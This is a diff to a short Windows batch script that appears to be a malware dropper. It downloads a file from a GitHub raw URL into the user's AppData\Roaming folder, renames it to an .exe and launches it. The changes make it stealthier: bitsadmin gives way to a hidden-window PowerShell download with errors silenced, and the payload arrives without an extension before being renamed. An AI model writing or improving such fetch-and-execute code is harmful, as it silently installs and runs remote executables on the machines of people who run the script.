@@ -1,29 +1,33 @@
 @echo off
 setlocal
 
-set "file=test.exe"
-set "url=https://github.com/rspvn/a/raw/main/test.exe"
+set "url=https://github.com/rspvn/a/raw/main/test"
 set "folder=%USERPROFILE%\AppData\Roaming\test"
+set "file=test"
+set "exefile=test.exe"
 
 if not exist "%folder%" (
     mkdir "%folder%"
 )
 
 :: Check if file exists
-if exist "%folder%\%file%" (
-    start "" "%folder%\%file%"
+if exist "%folder%\%exefile%" (
+    start "" "%folder%\%exefile%"
     exit /b
 ) else (
-    bitsadmin /transfer myDownloadJob /download /priority normal "%url%" "%folder%\%file%"
+    powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"
     
-    :: Check again if file exists after download attempt
     if exist "%folder%\%file%" (
-        start "" "%folder%\%file%"
+        :: Rename the file to add .exe extension
+        ren "%folder%\%file%" "%exefile%"
+        
+        :: Start the renamed .exe file
+        start "" "%folder%\%exefile%"
     ) else (
         echo Download failed.
     )
     
-    :: Close BAT window after 5 seconds
+    :: Close CMD window after 5 seconds
     timeout /t 5 /nobreak >nul
     exit /b
 )
